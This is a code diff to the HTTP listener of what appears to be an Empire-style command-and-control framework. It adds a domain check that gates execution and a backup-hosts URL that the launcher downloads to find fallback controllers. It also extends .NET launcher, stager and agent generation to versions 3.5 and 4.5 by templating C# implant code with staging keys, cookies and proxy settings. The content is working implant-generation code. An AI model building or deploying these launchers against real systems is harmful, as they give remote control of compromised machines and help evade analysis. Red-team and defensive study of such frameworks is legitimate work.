@@ -151,12 +151,24 @@ class Listener(object):
                 'Description': 'The Slack channel or DM that notifications will be sent to.',
                 'Required': False,
                 'Value': '#general'
-            }
+            },
+            'DomainCheck' : {
+                'Description'   :   'Check whether in domain else not execute',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'BackupHostsSource' : {
+                'Description'   :   'Url where to get backupHosts to use when up to StagerRetries.',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+
         }
         
         # required:
         self.mainMenu = mainMenu
         self.threads = {}
+        self.dotnetVersion = {'20':'35','40':'45'}
         
         # optional/specific for this module
         self.app = None
@@ -290,6 +302,8 @@ class Listener(object):
             uris = [a for a in profile.split('|')[0].split(',')]
             stage0 = random.choice(uris)
             customHeaders = profile.split('|')[2:]
+            backupHostsSource = listenerOptions['BackupHostsSource']['Value']
+            domainCheck = listenerOptions['DomainCheck']['Value']
             
             cookie = listenerOptions['Cookie']['Value']
             # generate new cookie if the current session cookie is empty to avoid empty cookie if create multiple listeners
@@ -516,6 +530,7 @@ class Listener(object):
                     return launcherBase
             
             if language.startswith('do'):
+                version=language[6:]
                 f = open(self.mainMenu.installPath + "./data/agent/launchers/http.cs",'r')
                 code = f.read()
                 f.close()
@@ -529,7 +544,15 @@ class Listener(object):
                         code = code.replace('wc.Proxy = WebRequest.DefaultWebProxy;', 'wc.Proxy = new WebProxy("%s");' % proxy)
                 else:
                     code = code.replace('wc.Proxy = WebRequest.DefaultWebProxy;', '')
-               
+                
+                if backupHostsSource != "":
+                    code = code.replace('//ser=wc.DownloadString("").Trim();','ser=wc.DownloadString("%s").Trim();' % backupHostsSource)
+
+                if domainCheck != "":
+                    code = code.replace('System.Environment.UserDomainName.Equals("")','System.Environment.UserDomainName.Equals("%s")' % domainCheck)
+                else:
+                    code = code.replace('System.Environment.UserDomainName.Equals("")','true')
+
                 if proxyCreds.lower() != 'none':
                     if proxyCreds.lower() != "default":
                         username = proxyCreds.split(':')[0]
@@ -544,17 +567,20 @@ class Listener(object):
                 else:
                     code = code.replace('wc.Proxy.Credentials = CredentialCache.DefaultCredentials;', '')
 
-                routingPacket = packets.build_routing_packet(stagingKey, sessionID='00000000', language='DOTNET', meta='STAGE0', additional='None', encData='')
-                b64RoutingPacket = base64.b64encode(routingPacket)
+                routingPacket35 = packets.build_routing_packet(stagingKey, sessionID='00000000', language='DOTNET35', meta='STAGE0', additional='None', encData='')
+                b64RoutingPacket35 = base64.b64encode(routingPacket35)
+                routingPacket45 = packets.build_routing_packet(stagingKey, sessionID='00000000', language='DOTNET45', meta='STAGE0', additional='None', encData='')
+                b64RoutingPacket45 = base64.b64encode(routingPacket45)
 
                 code = code.replace('string u = "";', 'string u = "%s";' % userAgent)
                 code = code.replace('string k = "";', 'string k = "%s";' % stagingKey)
                 code = code.replace('string ser = Encoding.Unicode.GetString(Convert.FromBase64String(""));', 'string ser = Encoding.Unicode.GetString(Convert.FromBase64String("%s"));' % helpers.enc_powershell(host))
-                code = code.replace('wc.Headers.Add("Cookie", "");', 'wc.Headers.Add("Cookie", "%s=%s");' % (cookie, b64RoutingPacket))
+                code = code.replace('wc.Headers.Add("Cookie", "35");', 'wc.Headers.Add("Cookie", "%s=%s");' % (cookie, b64RoutingPacket35))
+                code = code.replace('wc.Headers.Add("Cookie", "45");', 'wc.Headers.Add("Cookie", "%s=%s");' % (cookie, b64RoutingPacket45))
                 f = open(self.mainMenu.installPath + "./data/dotnet/compiler/data/Tasks/CSharp/Launcher.task",'w')
                 f.write(code)
                 f.close()
-                code = helpers.get_dotnet_module_assembly_with_source(self.mainMenu.installPath,'Launcher','Launcher.task','3.5','1')
+                code = helpers.get_dotnet_module_assembly_with_source(self.mainMenu.installPath,'Launcher','Launcher.task',version,'1')
                 return code
             else:
                 print(helpers.color(
@@ -684,8 +710,9 @@ class Listener(object):
                 # otherwise return the standard stager
                 return stager
         
-        elif language.lower() == 'dotnet':
+        elif language.lower().startswith('dotnet'):
             # read in the stager base
+            version=language[6:]
             f = open("%s/data/agent/stagers/http.cs" % (self.mainMenu.installPath))
             stager = f.read()
             f.close()
@@ -723,7 +750,7 @@ class Listener(object):
             f = open(self.mainMenu.installPath + "./data/dotnet/compiler/data/Tasks/CSharp/Stager.task",'w')
             f.write(stager)
             f.close()
-            stager = helpers.get_dotnet_module_assembly_with_source(self.mainMenu.installPath,'Stager','Stager.task','3.5','2')
+            stager = helpers.get_dotnet_module_assembly_with_source(self.mainMenu.installPath,'Stager','Stager.task',version,'2')
             return base64.b64encode(stager)
         else:
             print(helpers.color(
@@ -806,7 +833,8 @@ class Listener(object):
             
             return code
             
-        elif language == 'dotnet':
+        elif language.startswith('dotnet'):
+            version=language[6:]
             f = open(self.mainMenu.installPath + "./data/agent/agent.cs",'r')
             code = f.read()
             f.close()
@@ -818,7 +846,7 @@ class Listener(object):
             f = open(self.mainMenu.installPath + "./data/dotnet/compiler/data/Tasks/CSharp/Agent.task",'w')
             f.write(code)
             f.close()
-            code = helpers.get_dotnet_module_assembly_with_source(self.mainMenu.installPath,'Agent','Agent.task','3.5','2')
+            code = helpers.get_dotnet_module_assembly_with_source(self.mainMenu.installPath,'Agent','Agent.task',version,'2')
             return base64.b64encode(code)
         else:
             print(helpers.color(
